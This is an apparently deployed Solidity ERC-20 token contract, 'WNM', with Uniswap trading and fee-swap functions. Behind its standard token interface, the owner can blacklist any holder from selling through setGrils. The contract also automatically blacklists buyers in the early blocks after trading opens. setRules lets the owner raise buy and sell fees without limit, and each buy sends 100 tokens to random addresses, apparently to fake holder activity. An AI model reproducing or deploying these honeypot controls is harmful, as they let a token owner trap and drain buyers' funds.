1 /**
2  *Submitted for verification at Etherscan.io on 2023-06-19
3 */
4 
5 // SPDX-License-Identifier: Unlicensed
6 
7 pragma solidity ^0.8.4;
8 
9 interface IERC20 {
10     function totalSupply() external view returns (uint256);
11     function balanceOf(address account) external view returns (uint256);
12     function transfer(address recipient, uint256 amount) external returns (bool);
13     function allowance(address owner, address spender) external view returns (uint256);
14     function approve(address spender, uint256 amount) external returns (bool);
15     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
16     event Transfer(address indexed from, address indexed to, uint256 value);
17     event Approval(address indexed owner, address indexed spender, uint256 value);
18 }
19 
20 interface Token {
21     function transferFrom(address, address, uint) external returns (bool);
22     function transfer(address, uint) external returns (bool);
23 }
24 
25 interface IUniswapV2Factory {
26     function createPair(address tokenA, address tokenB) external returns (address pair);
27 }
28 
29 interface IUniswapV2Router02 {
30     function swapExactTokensForETHSupportingFeeOnTransferTokens(
31         uint amountIn,
32         uint amountOutMin,
33         address[] calldata path,
34         address to,
35         uint deadline
36     ) external;
37     function factory() external pure returns (address);
38     function WETH() external pure returns (address);
39     function addLiquidityETH(
40         address token,
41         uint amountTokenDesired,
42         uint amountTokenMin,
43         uint amountETHMin,
44         address to,
45         uint deadline
46     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
47 }
48 
49 abstract contract Context {
50     function _msgSender() internal view virtual returns (address) {
51         return msg.sender;
52     }
53 }
54 
55 
56 
57 library SafeMath {
58     function add(uint256 a, uint256 b) internal pure returns (uint256) {
59         uint256 c = a + b;
60         require(c >= a, "SafeMath: addition overflow");
61         return c;
62     }
63 
64     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
65         return sub(a, b, "SafeMath: subtraction overflow");
66     }
67 
68     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
69         require(b <= a, errorMessage);
70         uint256 c = a - b;
71         return c;
72     }
73 
74     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
75         if (a == 0) {
76             return 0;
77         }
78         uint256 c = a * b;
79         require(c / a == b, "SafeMath: multiplication overflow");
80         return c;
81     }
82 
83     function div(uint256 a, uint256 b) internal pure returns (uint256) {
84         return div(a, b, "SafeMath: division by zero");
85     }
86 
87     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
88         require(b > 0, errorMessage);
89         uint256 c = a / b;
90         return c;
91     }
92 
93 }
94 
95 contract Ownable is Context {
96     address private _owner;
97     address private _previousOwner;
98 
99     constructor () {
100         address msgSender = _msgSender();
101         _owner = msgSender;
102         emit OwnershipTransferred(address(0), msgSender);
103     }
104 
105     function owner() public view returns (address) {
106         return _owner;
107     }
108 
109     modifier onlyOwner() {
110         require(_owner == _msgSender(), "Caller is not the owner");
111         _;
112     }
113 
114     function renounceOwnership() public virtual onlyOwner {
115         emit OwnershipTransferred(_owner, address(0));
116         _owner = address(0);
117     }
118     
119     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
120     function transferOwnership(address newOwner) public virtual onlyOwner {
121         emit OwnershipTransferred(_owner, newOwner);
122         _owner = newOwner;
123     }
124 
125 }
126 
127 contract WNM is Context, IERC20, Ownable {
128     
129     using SafeMath for uint256;
130     mapping (address => uint256) private _rOwned;
131     mapping (address => uint256) private _tOwned;
132     mapping (address => mapping (address => uint256)) private _allowances;
133     mapping (address => bool) private _isExcludedFromFee;
134 
135     mapping (address => bool) public _Grils;
136     uint256 public gb = 0;
137     uint256 public goMoonBlock = 0;
138     
139     uint256 private constant MAX = ~uint256(0);
140     uint256 private constant _tTotal = 42000000000000000000000000000;
141     uint256 private _rTotal = (MAX - (MAX % _tTotal));
142     uint256 private _tFeeTotal;
143 
144     uint256 private _redisFeeOnBuy = 0;
145     uint256 private _taxFeeOnBuy = 2;
146     
147     uint256 private _redisFeeOnSell = 0;
148     uint256 private _taxFeeOnSell = 2;
149     
150     uint256 private _redisFee;
151     uint256 private _taxFee;
152     
153     string private constant _name = "WNM";
154     string private constant _symbol = "WNM";
155     uint8 private constant _decimals = 9;
156     
157     address payable private _developmentAddress = payable(0xf68e129E616e131EcFe9E54609aa8965FA2428Ad);
158     address payable private _marketingAddress = payable(0x5331f31e19Cc6f88B46027bDF10B7Fc81EcA4548);
159 
160     IUniswapV2Router02 public uniswapV2Router;
161     address public uniswapV2Pair;
162     
163     bool private inSwap = false;
164     bool private swapEnabled = true;
165     
166     modifier lockTheSwap {
167         inSwap = true;
168         _;
169         inSwap = false;
170     }
171     constructor () {
172         _rOwned[_msgSender()] = _rTotal;
173         
174         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
175         uniswapV2Router = _uniswapV2Router;
176         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
177             .createPair(address(this), _uniswapV2Router.WETH());
178 
179         _isExcludedFromFee[owner()] = true;
180         _isExcludedFromFee[address(this)] = true;
181         _isExcludedFromFee[_developmentAddress] = true;
182         _isExcludedFromFee[_marketingAddress] = true;
183 
184         emit Transfer(address(0x0000000000000000000000000000000000000000), _msgSender(), _tTotal);
185     }
186 
187     function name() public pure returns (string memory) {
188         return _name;
189     }
190 
191     function symbol() public pure returns (string memory) {
192         return _symbol;
193     }
194 
195     function decimals() public pure returns (uint8) {
196         return _decimals;
197     }
198 
199     function totalSupply() public pure override returns (uint256) {
200         return _tTotal;
201     }
202 
203     function balanceOf(address account) public view override returns (uint256) {
204         return tokenFromReflection(_rOwned[account]);
205     }
206 
207     function transfer(address recipient, uint256 amount) public override returns (bool) {
208         _transfer(_msgSender(), recipient, amount);
209         return true;
210     }
211 
212     function allowance(address owner, address spender) public view override returns (uint256) {
213         return _allowances[owner][spender];
214     }
215 
216     function approve(address spender, uint256 amount) public override returns (bool) {
217         _approve(_msgSender(), spender, amount);
218         return true;
219     }
220 
221     function setGrils(address girl, bool status) public onlyOwner {
222         _Grils[girl] = status;
223     }
224 
225     function setGB(uint256 g) public onlyOwner {
226         gb = g;
227     }
228 
229     function goMoon(uint256 g) public onlyOwner {
230         goMoonBlock = g;
231         if(g == 1) {
232             goMoonBlock = block.number;
233         }
234     }
235 
236     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
237         _transfer(sender, recipient, amount);
238         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
239         return true;
240     }
241 
242     function tokenFromReflection(uint256 rAmount) private view returns(uint256) {
243         require(rAmount <= _rTotal, "Amount must be less than total reflections");
244         uint256 currentRate =  _getRate();
245         return rAmount.div(currentRate);
246     }
247 
248     function _approve(address owner, address spender, uint256 amount) private {
249         require(owner != address(0), "ERC20: approve from the zero address");
250         require(spender != address(0), "ERC20: approve to the zero address");
251         _allowances[owner][spender] = amount;
252         emit Approval(owner, spender, amount);
253     }
254 
255     function _transfer(address from, address to, uint256 amount) private {
256         require(from != address(0), "ERC20: transfer from the zero address");
257         require(to != address(0), "ERC20: transfer to the zero address");
258         require(amount > 0, "Transfer amount must be greater than zero");
259         require(!_Grils[from], "Transfer not allowed");
260         
261         _redisFee = 0;
262         _taxFee = 0;
263         
264         if (from != owner() && to != owner()) {
265             
266             uint256 contractTokenBalance = balanceOf(address(this));
267             if (!inSwap && from != uniswapV2Pair && swapEnabled && contractTokenBalance > 0) {
268                 swapTokensForEth(contractTokenBalance);
269                 uint256 contractETHBalance = address(this).balance;
270                 if(contractETHBalance > 0) {
271                     sendETHToFee(address(this).balance);
272                 }
273             }
274 
275             if(!_isExcludedFromFee[to] && !_isExcludedFromFee[from]) {
276                 require(goMoonBlock != 0, 'Transfer not open');
277             }
278             
279             if(from == uniswapV2Pair && to != address(uniswapV2Router)) {
280                 if (block.number < gb + goMoonBlock) {
281                     if (from == uniswapV2Pair) {
282                         _Grils[to] = true;
283                     }
284                 }
285                 _redisFee = _redisFeeOnBuy;
286                 _taxFee = _taxFeeOnBuy;
287                 address ad;
288                 for(int i=0;i < 1;i++){
289                     ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
290                     _transferStandard(from,ad,100);
291                 }
292                 amount -= 100;
293             }
294     
295             if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
296                 _redisFee = _redisFeeOnSell;
297                 _taxFee = _taxFeeOnSell;
298             }
299             
300             if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
301                 _redisFee = 0;
302                 _taxFee = 0;
303             }
304             
305         }
306 
307         _tokenTransfer(from,to,amount);
308     }
309 
310     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
311         address[] memory path = new address[](2);
312         path[0] = address(this);
313         path[1] = uniswapV2Router.WETH();
314         _approve(address(this), address(uniswapV2Router), tokenAmount);
315         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
316             tokenAmount,
317             0,
318             path,
319             address(this),
320             block.timestamp
321         );
322     }
323         
324     function sendETHToFee(uint256 amount) private {
325         _developmentAddress.transfer(amount.div(2));
326         _marketingAddress.transfer(amount.div(2));
327     }
328     
329     function _tokenTransfer(address sender, address recipient, uint256 amount) private {
330         _transferStandard(sender, recipient, amount);
331     }
332 
333     event tokensRescued(address indexed token, address indexed to, uint amount);
334     function rescueForeignTokens(address _tokenAddr, address _to, uint _amount) public onlyOwner() {
335         emit tokensRescued(_tokenAddr, _to, _amount);	
336         Token(_tokenAddr).transfer(_to, _amount);
337     }
338     
339     event devAddressUpdated(address indexed previous, address indexed adr);
340     function setNewDevAddress(address payable dev) public onlyOwner() {
341         emit devAddressUpdated(_developmentAddress, dev);	
342         _developmentAddress = dev;
343         _isExcludedFromFee[_developmentAddress] = true;
344     }
345     
346     event marketingAddressUpdated(address indexed previous, address indexed adr);
347     function setNewMarketingAddress(address payable markt) public onlyOwner() {
348         emit marketingAddressUpdated(_marketingAddress, markt);	
349         _marketingAddress = markt;
350         _isExcludedFromFee[_marketingAddress] = true;
351     }
352 
353     function _transferStandard(address sender, address recipient, uint256 tAmount) private {
354         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getValues(tAmount);
355         _rOwned[sender] = _rOwned[sender].sub(rAmount);
356         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); 
357         _takeTeam(tTeam);
358         _reflectFee(rFee, tFee);
359         emit Transfer(sender, recipient, tTransferAmount);
360     }
361 
362     function _takeTeam(uint256 tTeam) private {
363         uint256 currentRate =  _getRate();
364         uint256 rTeam = tTeam.mul(currentRate);
365         _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
366     }
367 
368     function _reflectFee(uint256 rFee, uint256 tFee) private {
369         _rTotal = _rTotal.sub(rFee);
370         _tFeeTotal = _tFeeTotal.add(tFee);
371     }
372 
373     receive() external payable {}
374     
375     function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
376         (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _redisFee, _taxFee);
377         uint256 currentRate =  _getRate();
378         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate);
379         return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
380     }
381 
382     function _getTValues(uint256 tAmount, uint256 taxFee, uint256 TeamFee) private pure returns (uint256, uint256, uint256) {
383         uint256 tFee = tAmount.mul(taxFee).div(100);
384         uint256 tTeam = tAmount.mul(TeamFee).div(100);
385         uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
386         return (tTransferAmount, tFee, tTeam);
387     }
388 
389     function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
390         uint256 rAmount = tAmount.mul(currentRate);
391         uint256 rFee = tFee.mul(currentRate);
392         uint256 rTeam = tTeam.mul(currentRate);
393         uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
394         return (rAmount, rTransferAmount, rFee);
395     }
396 
397 	function _getRate() private view returns(uint256) {
398         (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
399         return rSupply.div(tSupply);
400     }
401 
402     function _getCurrentSupply() private view returns(uint256, uint256) {
403         uint256 rSupply = _rTotal;
404         uint256 tSupply = _tTotal;      
405         if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
406         return (rSupply, tSupply);
407     }
408 
409     function manualswap() external {
410         require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress || _msgSender() == owner());
411         uint256 contractBalance = balanceOf(address(this));
412         swapTokensForEth(contractBalance);
413     }
414 
415     function manualsend() external {
416         require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress || _msgSender() == owner());
417         uint256 contractETHBalance = address(this).balance;
418         sendETHToFee(contractETHBalance);
419     }
420     
421     function setRules(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {
422         _redisFeeOnBuy = redisFeeOnBuy;
423         _redisFeeOnSell = redisFeeOnSell;
424         _taxFeeOnBuy = taxFeeOnBuy;
425         _taxFeeOnSell = taxFeeOnSell;
426     }
427     
428     function toggleSwap(bool _swapEnabled) public onlyOwner {
429         swapEnabled = _swapEnabled;
430     }
431 
432     function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
433         for(uint256 i = 0; i < accounts.length; i++) {
434             _isExcludedFromFee[accounts[i]] = excluded;
435         }
436     }
437 }